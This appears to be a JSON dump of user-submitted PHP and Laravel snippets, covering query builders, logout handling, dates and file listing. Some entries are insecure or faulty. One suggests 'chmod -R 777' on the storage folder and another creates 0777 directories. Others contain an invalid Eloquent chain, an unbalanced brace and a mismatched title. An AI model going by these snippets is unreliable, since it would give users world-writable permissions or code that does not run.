    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2797,
    "keyword": null,
    "link": null,
    "title": " laravel where creation is today carbon",
    "description": "use Carbon\\Carbon; $date = Carbon::now(); //Get date and time $date->toDateTimeString(); //Get date $date->toDateString();\n    $posts = Post::whereDate('created_at', Carbon::today())->get();\n$today = Carbon::now()->format('Y-m-d'); //yyyy-mm-dd etc\n$q->whereDay('created_at', '=', date('d')); $q->whereMonth('created_at', '=', date('m')); $q->whereYear('created_at', '=', date('Y'));\n$q->where('created_at', '>=', date('Y-m-d').' 00:00:00'));\n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2798,
    "keyword": null,
    "link": null,
    "title": " laravel where equal",
    "description": "//Laravel - Where equal Person::where('age','=', 50);\n",
    "reg_date": "2021-10-12T10:16:53.000Z"
  },
  {
    "id": 2799,
    "keyword": null,
    "link": null,
    "title": " laravel where has",
    "description": "use Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); })->get();  // Retrieve posts with at least ten comments containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); }, '>=', 10)->get();\nclass Country extends Model {     public function posts()     {         return $this->hasManyThrough(             'App\\Post',             'App\\User',             'country_id', // Foreign key on users table...             'user_id', // Foreign key on posts table...             'id', // Local key on countries table...             'id' // Local key on users table...         );     } }  when countries     id - integer     name - string  users     id - integer     country_id - integer     name - string  posts     id - integer     user_id - integer     title - string\nuse Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); })->get();  // Retrieve posts with at least ten comments containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); }, '>=', 10)->get();\n$movies = Movie::whereHas('director', function($q) {     $q->where('name', 'great'); })->get(); \n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2800,
    "keyword": null,
    "link": null,
    "title": " laravel where in",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \n$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\n$camps = $field->camps()->where('status', 0)->where(function ($q) {     $q->where('sex', Auth::user()->sex)->orWhere('sex', 0); })->get();\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$users = DB::table('users')->whereIn('id', array(1, 2, 3))->get()\n$users = DB::table('users')->whereIn('id', array(1, 2, 3))->get() \n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2801,
    "keyword": null,
    "link": null,
    "title": " laravel where in array",
    "description": "$items = Item::whereIn('id', [1,2,..])->get(); \n$items = DB::table('items')->whereIn('id',[1,2,..])->get();\n$items = Item::whereIn('id', [1,2,..])->get();\n$items = DB::table('items')->whereIn('id', [1, 2, 3])->get();\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2802,
    "keyword": null,
    "link": null,
    "title": " laravel where is null",
    "description": "DB::table('users')\t->whereNotNull('name')\t->get();\nDB::table('users')\t->whereNull('name')\t->get();\n DB::table('users')             ->whereNull('first_name');\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2803,
    "keyword": null,
    "link": null,
    "title": " laravel where like",
    "description": "User::query()    ->where('name', 'LIKE', \"%{$searchTerm}%\")     ->orWhere('email', 'LIKE', \"%{$searchTerm}%\")     ->get();  reference: https://freek.dev/1182-searching-models-using-a-where-like-query-in-laravel\n$data = DB::table('borrowers')         ->join('loans', 'borrowers.id', '=', 'loans.borrower_id')         ->select('borrowers.*', 'loans.*')            ->where('loan_officers', 'like', '%' . $officerId . '%')         ->where('loans.maturity_date', '<', date(\"Y-m-d\"))         ->get(); \n$camps = $field->camps()->where('status', 0)->where(function ($q) {     $q->where('sex', Auth::user()->sex)->orWhere('sex', 0); })->get();\n$users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\n$users = DB::table('users')                 ->where('votes', '>=', 100)                 ->get();  $users = DB::table('users')                 ->where('votes', '<>', 100)                 ->get();  $users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\n$book = array('book2','book3','book5');    $name = DB::Table('bookinfo')         ->select('BookName', 'bookId')                         ->Where(function ($query) use($book) {              for ($i = 0; $i < count($book); $i++){                 $query->orwhere('bookname', 'like',  '%' . $book[$i] .'%');              }               })->get(); \n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2804,
    "keyword": null,
    "link": null,
    "title": " laravel where multiple conditions",
    "description": "$query->where([     ['column_1', '=', 'value_1'],     ['column_2', '<>', 'value_2'],     [COLUMN, OPERATOR, VALUE],     ... ])\n  public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })->get();            dd($users);     }  # With Join   public function index()     {         $search = \"Har\";            $users = User::select(\"*\")->where('status', 1)                   ->where(function($query) use ($search){                    $query->where('first_name', 'LIKE', '%'.$search.'%')                    ->orWhere('last_name', 'LIKE', '%'.$search.'%')                    ->orWhere('email', 'LIKE', '%'.$search.'%');                     })           ->join('users_roles', 'users.id', '=', 'users_roles.user_id')           ->where('users_roles.role_id', '=', Role::USER_PARTICIPANT)->get();            dd($users);     }\n// ... $q->where(function ($query) {     $query->where('gender', 'Male')         ->where('age', '>=', 18); })->orWhere(function($query) {     $query->where('gender', 'Female')         ->where('age', '>=', 65);\t })\n//laravel // here, i have used two different where condition on a single column $today = Carbon::today(); $data = Users::where('type',1)         ->where(function($query) use ($today) {             return $query->whereDate('updated_at','!=', $today)             ->orWhere('updated_at',null);          })          ->get();\npublic function index(){    $users = User::select('*')                ->where('active', '=', 1)                ->where('is_ban', '=', 0)                ->get();       dd($users);}\npublic function index(){    $users = User::select('*')                ->where([                    ['active', '=', 1],                    ['is_ban', '=', 0]                ])                ->get();       dd($users);}\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2805,
    "keyword": null,
    "link": null,
    "title": " laravel where multiple conditions on single colmn",
    "description": "$query->where([     ['column_1', '=', 'value_1'],     ['column_2', '<>', 'value_2'],     [COLUMN, OPERATOR, VALUE],     ... ])\n//laravel // here, i have used two different where condition on a single column $today = Carbon::today(); $data = Users::where('type',1)         ->where(function($query) use ($today) {             return $query->whereDate('updated_at','!=', $today)             ->orWhere('updated_at',null);          })          ->get();\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2806,
    "keyword": null,
    "link": null,
    "title": " laravel where on relationsship column",
    "description": "Player::whereHas('roleplay', function($q){    $q->where('column_name', 'value'); })->get(); \n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2807,
    "keyword": null,
    "link": null,
    "title": " laravel where update query",
    "description": "DB::table('users')         ->where('id', $id)         ->update([             'status'     => 1         ]);\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2808,
    "keyword": null,
    "link": null,
    "title": " laravel wherehas",
    "description": "$users = User::whereHas('posts', function($q){     $q->where('created_at', '>=', '2015-01-01 00:00:00'); })->get(); // only users that have posts from 2015 on forward are returned \nuse Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); })->get();  // Retrieve posts with at least ten comments containing words like foo%... $posts = App\\Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'foo%'); }, '>=', 10)->get();\n// Detach a single role from the user... $user->roles()->detach($roleId);  // Detach all roles from the user... $user->roles()->detach();\n                ->whereHas('translation', function ($query) use ($name){                     $query->where('name', 'like', $name);                 }, '>=', 10) \nuse Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); })->get();  // Retrieve posts with at least ten comments containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); }, '>=', 10)->get();\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\n",
    "reg_date": "2021-10-12T10:16:54.000Z"
  },
  {
    "id": 2809,
    "keyword": null,
    "link": null,
    "title": " laravel with trashed",
    "description": "$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\nSoft Delete : $user->delete(); Force Delete : $user->forceDelete(); Restore Soft Deleted Item : $user->restore();\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\n$flights = App\\Flight::withTrashed()                 ->where('account_id', 1)                 ->get();\n$user->roles()->withTrashed()->get();\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2810,
    "keyword": null,
    "link": null,
    "title": " laravel withcount",
    "description": "$posts = App\\Post::withCount('comments')->get();  foreach ($posts as $post) {     echo $post->comments_count; }\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2811,
    "keyword": null,
    "link": null,
    "title": " laravel withtrashed",
    "description": "public function category() { \treturn $this->belongsTo('App\\Category')->withTrashed(); }\npublic function destroy($id){    $res=User::find($id)->delete();   if ($res){     $data=[     'status'=>'1',     'msg'=>'success'   ];   }else{     $data=[     'status'=>'0',     'msg'=>'fail'   ];   return response()->json($data); \n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2812,
    "keyword": null,
    "link": null,
    "title": " larevel version artisan",
    "description": "// LARAVEL VERSION COMMAND (Console) php artisan --version\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2813,
    "keyword": null,
    "link": null,
    "title": " larvel check two password",
    "description": "$hashedPassword = User::find(1)->password;  if (Hash::check('plain-text-password', $hashedPassword)) {     // The passwords match... }\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2814,
    "keyword": null,
    "link": null,
    "title": " larvel make http request",
    "description": "// To make requests, you may use the get, post, put, patch, and delete methods // provided by the Http facade.  use Illuminate\\Support\\Facades\\Http;  $response = Http::get('http://example.com');  // The get method returns an instance of Illuminate\\Http\\Client\\Response, // which provides a variety of methods that may be used to inspect the response: $response->body() : string; $response->json() : array|mixed; $response->collect() : Illuminate\\Support\\Collection; $response->status() : int; $response->ok() : bool; $response->successful() : bool; $response->failed() : bool; $response->serverError() : bool; $response->clientError() : bool; $response->header($header) : string; $response->headers() : array;\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2815,
    "keyword": null,
    "link": null,
    "title": " larvel page isn't working",
    "description": "change permission of storage directory chmod -R 777 storage/\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2816,
    "keyword": null,
    "link": null,
    "title": " last day of previous month in php",
    "description": "$lastDay = date('t',strtotime('last month'));  print_r($lastDay);\n$lastDateOfNextMonth =strtotime('last day of next month') ;  $lastDay = date('d/m/Y', $lastDateOfNextMonth);     print_r($lastDay);\n$tgl = '25 january 2012';  $prevmonth = date(\"M Y\",mktime(0,0,0,date(\"m\", strtotime($tgl))-1,1,date(\"Y\", strtotime($tgl)))); echo $prevmonth;\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2817,
    "keyword": null,
    "link": null,
    "title": " last insert id",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn = mysqli_connect($servername, $username, $password, $dbname); // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); }  $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\";  if (mysqli_query($conn, $sql)) {     $last_id = mysqli_insert_id($conn);     echo \"New record created successfully. Last inserted ID is: \" . $last_id; } else {     echo \"Error: \" . $sql . \"<br>\" . mysqli_error($conn); }  mysqli_close($conn); ?>\n$last_id = $conn->insert_id;\n-- To get the last inserted auto-increment row ID: -- SELECT LAST_INSERT_ID( optional_expression )  -- If you have just inserted it using a command in C# use: -- int lastId = (Int32)yourCommand.LastInsertedId;\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2818,
    "keyword": null,
    "link": null,
    "title": " last insert id model codeigniter",
    "description": "$id = $this->db->insert_id();\nfunction add_post($post_data){    $this->db->insert('posts', $post_data);    $insert_id = $this->db->insert_id();     return  $insert_id; }\n   $this->db->insert('posts', $post_data);    $insert_id = $this->db->insert_id();    return  $insert_id;\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2819,
    "keyword": null,
    "link": null,
    "title": " last login date time in wordpress",
    "description": "#Set function user_last_login( $user_login, $user ) {     update_user_meta( $user->ID, 'last_login', time() ); } add_action( 'wp_login', 'user_last_login', 10, 2 );  #get echo get_user_meta( $user->ID, 'last_login' , true );\n",
    "reg_date": "2021-10-12T10:16:55.000Z"
  },
  {
    "id": 2820,
    "keyword": null,
    "link": null,
    "title": " left join laravel",
    "description": "Inner Join \t: ->join('contacts', 'users.id', '=', 'contacts.user_id') Left Join \t: ->leftJoin('posts', 'users.id', '=', 'posts.user_id') Right Join \t: ->rightJoin('posts', 'users.id', '=', 'posts.user_id') Cross Join \t: ->crossJoin('colors')  Advance Queries :  -----------------   \t\t->join('contacts', function ($join) {             $join->on('users.id', '=', 'contacts.user_id')                  ->where('contacts.user_id', '>', 5);         })   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n$users = DB::table('users')             ->leftJoin('posts', 'users.id', '=', 'posts.user_id')             ->get();  $users = DB::table('users')             ->rightJoin('posts', 'users.id', '=', 'posts.user_id')             ->get();\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2821,
    "keyword": null,
    "link": null,
    "title": " like %% inside the array php",
    "description": "preg_match('~' . preg_quote('.SEARCH_ITEM.', '~') . '~', 'STRING');\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2822,
    "keyword": null,
    "link": null,
    "title": " limit 1 1 in laravel query",
    "description": "$products = $art->products->skip(10)->take(10)->get(); //get next 10 rows\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2823,
    "keyword": null,
    "link": null,
    "title": " limit laravel",
    "description": "$posts = Post::all()->limit(10)->get();\n$products = $art->products->skip(10)->take(10)->get(); //get next 10 rows\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2824,
    "keyword": null,
    "link": null,
    "title": " limit offset array php",
    "description": "array_slice($array, 0, 50); // same as offset 0 limit 50 in sql\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2825,
    "keyword": null,
    "link": null,
    "title": " limit pagination page number cakephp",
    "description": "$all_settings = array(   'limit' => 100,\t// limit pagination page number: 100 record / page   'fields' => array(     'Product.*',   ),   'conditions' => $conditions,    'order' => array(     'Product.is ASC',   ),   'contain' => array(     'ProductLanguage' => array(       'conditions' => array(         'ProductLanguage.alias' => $this->lang18,       ),       'fields' => array(         'ProductLanguage.title',       ),     ),   ),   'recursive' => -1,  );  $this->Paginator->settings = $all_settings; $products = $this->paginate();\n// admin_index  $all_settings = array(   'contain' => array(     'CreditType' => array(       'CreditTypeLanguage' => array(         'conditions' => array(           'CreditTypeLanguage.alias' => $this->lang18, // 'zho', 'eng', 'chi'         ),       ),     ),   ),   'recursive' => 0, );  $this->Paginator->settings = $all_settings; $companyCredits = $this->paginate(); $this->set(compact('companyCredits'));\n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2826,
    "keyword": null,
    "link": null,
    "title": " limit two decimal php",
    "description": "return number_format((float)$number, 2, '.', ''); \n",
    "reg_date": "2021-10-12T10:16:56.000Z"
  },
  {
    "id": 2827,
    "keyword": null,
    "link": null,
    "title": " limiting requests to controllers in laravel",
    "description": "//Controller add  public function __construct() \t{ \t\t$this->middleware([ \t\t\t'auth', //About 20 requests per minute to Cotroller and error if there are too many requests \t\t\t'throttle:20,1'         ]); \t}\n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2828,
    "keyword": null,
    "link": null,
    "title": " link acf",
    "description": "<?php  $link = get_field('link'); if( $link ):      $link_url = $link['url'];     $link_title = $link['title'];     $link_target = $link['target'] ? $link['target'] : '_self';     ?>     <a class=\"button\" href=\"<?php echo esc_url( $link_url ); ?>\" target=\"<?php echo esc_attr( $link_target ); ?>\"><?php echo esc_html( $link_title ); ?></a> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2829,
    "keyword": null,
    "link": null,
    "title": " link input button in php",
    "description": "<input type=button onClick=\"parent.location='index.html'\" value='click here'>\n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2830,
    "keyword": null,
    "link": null,
    "title": " link js file in php",
    "description": "PHP is completely irrelevant for what you are doing. The generated HTML is what counts.  In your case, you are missing the src attribute. Use   <script type=\"text/javascript\" src=\"file.js\"></script>\n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2831,
    "keyword": null,
    "link": null,
    "title": " link to another page php",
    "description": "echo ' <a href=\"index1.php\">page1</a>'; echo '<a href=\"page2.php\">page2</a>';\nheader(\"Location: https://example.com\");  \n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2832,
    "keyword": null,
    "link": null,
    "title": " linux php script create directory if doesn't exist",
    "description": "$path = \"sample/path/newfolder\"; if (!file_exists($path)) {     mkdir($path, 0777, true); }\n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2833,
    "keyword": null,
    "link": null,
    "title": " linux set default php",
    "description": "//In ubunutu Default PHP 7.1 is set on your system and you need to switch to PHP 5.6  $ sudo a2dismod php7.1 $ sudo a2enmod php5.6 $ sudo service apache2 restart    sudo update-alternatives --set php /usr/bin/php5.6\n------------ Set Default PHP Version 7.0 ------------ $ sudo update-alternatives --set php /usr/bin/php7.0 \n$ sudo update-alternatives --config php  or $ sudo a2enmod php7.1(version) \nupdate-alternatives --set php /usr/bin/php7.4 update-alternatives --set phar /usr/bin/phar7.4 update-alternatives --set phar.phar /usr/bin/phar.phar7.4 update-alternatives --set phpize /usr/bin/phpize7.4 update-alternatives --set php-config /usr/bin/php-config7.4 \n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2834,
    "keyword": null,
    "link": null,
    "title": " list() php",
    "description": "$info = array('Doina', 'brown', 'long');  // Listing all the variables list($she, $color, $hear) = $info; echo \"$she has $color eyes color and $hear black hair.\\n\";\n <?php  $info = array('coffee', 'brown', 'caffeine');  // Listing all the variables list($drink, $color, $power) = $info; echo \"$drink is $color and $power makes it special.\\n\";  // Listing some of them list($drink, , $power) = $info; echo \"$drink has $power.\\n\";  // Or let's skip to only the third one list( , , $power) = $info; echo \"I need $power!\\n\";  // list() doesn't work with strings list($bar) = \"abcde\"; var_dump($bar); // NULL ?>  \n",
    "reg_date": "2021-10-12T10:16:57.000Z"
  },
  {
    "id": 2835,
    "keyword": null,
    "link": null,
    "title": " list all files in directory php",
    "description": "$path    = './'; $files = scandir($path); $files = array_diff(scandir($path), array('.', '..')); foreach($files as $file){   echo \"<a href='$file'>$file</a>\"; }\nforeach(glob('includes/*.php') as $file) {     ... }\nscandir ( string $directory [, int $sorting_order = SCANDIR_SORT_ASCENDING [, resource $context ]] ) : array\n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2836,
    "keyword": null,
    "link": null,
    "title": " live update mysql data in php",
    "description": "$(document).ready(function(){         loadstation(); });  function loadstation(){     $(\"#station_data\").load(\"station.php\");     setTimeout(loadstation, 2000); }\n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2837,
    "keyword": null,
    "link": null,
    "title": " livewire file upload",
    "description": "use Livewire\\WithFileUploads;  class UploadPhoto extends Component {     use WithFileUploads;      public $photo;      public function save()     {         $this->validate([             'photo' => 'image|max:1024', // 1MB Max         ]);          $this->photo->store('photos');     } }\n<form wire:submit.prevent=\"save\">     <input type=\"file\" wire:model=\"photo\">      @error('photo') <span class=\"error\">{{ $message }}</span> @enderror      <button type=\"submit\">Save Photo</button> </form>\n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2838,
    "keyword": null,
    "link": null,
    "title": " livewire onkeydown",
    "description": "<input wire:keydown.enter=\"doSomething\">\n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2839,
    "keyword": null,
    "link": null,
    "title": " load php in html",
    "description": "//Safe as: index.html number.php  //HTML: <html>    <head>       <title>Home</title>    </head>    <body>       <h1>Phone Number</h1>       <?php include('number.php') ?>    </body> </html>  //PHP: <?php    echo 4895553268; ?> \n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2840,
    "keyword": null,
    "link": null,
    "title": " location php ini mac os",
    "description": "sudo cp /private/etc/php.ini.default /private/etc/php.ini \n",
    "reg_date": "2021-10-12T10:16:58.000Z"
  },
  {
    "id": 2841,
    "keyword": null,
    "link": null,
    "title": " lodash tester",
    "description": "floatval ($var) \n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2842,
    "keyword": null,
    "link": null,
    "title": " log data into file php",
    "description": "//Something to write to txt log $log  = \"User: \".$_SERVER['REMOTE_ADDR'].' - '.date(\"F j, Y, g:i a\").PHP_EOL.         \"Attempt: \".($result[0]['success']=='1'?'Success':'Failed').PHP_EOL.         \"User: \".$username.PHP_EOL.         \"-------------------------\".PHP_EOL; //Save string to log, use FILE_APPEND to append. file_put_contents('./log_'.date(\"j.n.Y\").'.log', $log, FILE_APPEND); \n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2843,
    "keyword": null,
    "link": null,
    "title": " log facade laravel",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Monolog\\Logger;  $orderLog = new Logger('order'); $orderLog->pushHandler(new StreamHandler(storage_path('logs/mylogs.log')), Logger::INFO); $orderLog->info(\"Order id: ${orderId}\");\n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2844,
    "keyword": null,
    "link": null,
    "title": " logout in laravel",
    "description": "//make a route as a post and button should look like this  <form action=\"{{ route('logout') }}\" method=\"post\">        @csrf        <button type=\"submit\">Logout</button> </form> //Controller will be like this. public function store(){         auth()->logout();         return redirect()->route('home');     }\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\nuse Illuminate\\Http\\Request; use Illuminate\\Support\\Facades\\Auth;  /**  * Log the user out of the application.  *  * @param  \\Illuminate\\Http\\Request  $request  * @return \\Illuminate\\Http\\Response  */ public function logout(Request $request) {     Auth::logout();      $request->session()->invalidate();      $request->session()->regenerateToken();      return redirect('/'); }\nphp artisan migrate npm install && npm run dev \n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2845,
    "keyword": null,
    "link": null,
    "title": " logout in php",
    "description": "<?php if(isset($_GET['logout'])) {     session_destroy();     unset($_SESSION['uname']);     header('location:login.php'); } ?>\nif(isset($_GET['logout'])) {     session_destroy();     unset($_SESSION['username']);     header('location:login.php'); }\n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2846,
    "keyword": null,
    "link": null,
    "title": " logout php code",
    "description": "<?php if(isset($_GET['logout'])) {     session_destroy();     unset($_SESSION['uname']);     header('location:login.php'); } ?>\nif(isset($_GET['logout'])) {     session_destroy();     unset($_SESSION['username']);     header('location:login.php'); }\n <?php session_start(); ?> <html> <head> <title>User Login</title> </head> <body>  <?php if($_SESSION[\"name\"]) { ?> Welcome <?php echo $_SESSION[\"name\"]; ?>. Click here to <a href=\"logout.php\" tite=\"Logout\">Logout. <?php }else echo \"<h1>Please login first .</h1>\"; ?> </body> </html>  \n<?php   // If the user is logged in, delete the session vars to log them out   session_start();   if (isset($_SESSION['user_id'])) {     // Delete the session vars by clearing the $_SESSION array     $_SESSION = array();      // Delete the session cookie by setting its expiration to an hour ago (3600)     if (isset($_COOKIE[session_name()])) {      setcookie(session_name(), '', time() - 3600);    }      // Destroy the session     session_destroy();   }    // Delete the user ID and username cookies by setting their expirations to an hour ago (3600)   setcookie('user_id', '', time() - 3600);   setcookie('username', '', time() - 3600);    // Redirect to the home page   $home_url = 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/index.php';   header('Location: ' . $home_url); ?>\n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2847,
    "keyword": null,
    "link": null,
    "title": " long text in laravel migration",
    "description": "Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nSchema::create('posts', function ($table) {     $table->increments('id');     $table->integer('user_id');     // ...     $table->longText('description');     // ... } \n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2848,
    "keyword": null,
    "link": null,
    "title": " loop index foreach laravel",
    "description": "@foreach ($teams as $key => $team) {{ str_ordinal($key + 1) }} @endforeach \nforeach ($users as $user) {     // stuff here }\n//If you are working with a collection you can do something like this: foreach($collection as $item) {     if($collection->last() == $item) {         // last iteration     } }  //If you are working with an array (it also works with collections) you can do this: foreach($array as $item) {     if(end($array) == $item) {         // last iteration     } }\n",
    "reg_date": "2021-10-12T10:16:59.000Z"
  },
  {
    "id": 2849,
    "keyword": null,
    "link": null,
    "title": " loop object property laravel",
    "description": "foreach( $project->toArray() as $key => $value ) {     echo $key; }\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2850,
    "keyword": null,
    "link": null,
    "title": " loop over keys and values php",
    "description": "foreach ($arr as $key => $value) {  echo $key; } \necho $obj->name; echo $obj->age;\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2851,
    "keyword": null,
    "link": null,
    "title": " loop through months and year php",
    "description": "$start = $month = strtotime('2009-02-01'); $end = strtotime('2011-01-01'); while($month < $end) {      echo date('F Y', $month), PHP_EOL;      $month = strtotime(\"+1 month\", $month); }\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2852,
    "keyword": null,
    "link": null,
    "title": " loop through php array",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\nforeach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \nforeach($array as $i => $item) {     echo $item[$i]['filename'];     echo $item[$i]['filepath'];      // $array[$i] is same as $item }\n$letters = ['a','b','c']; foreach ($letters as $item) {   echo $item; }\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement\nforeach($array as $item) {     echo $item['filename'];     echo $item['filepath'];      // to know what's in $item     echo '<pre>'; var_dump($item); }\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2853,
    "keyword": null,
    "link": null,
    "title": " loop through values of hash php",
    "description": "foreach ($array as $key => $val) {     print \"$key = $val\\n\"; } \n<?php     while (list($var, $val) = each($array)) {         print \"$var is $val\\n\";     } ?> \n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2854,
    "keyword": null,
    "link": null,
    "title": " loop variable in laravel",
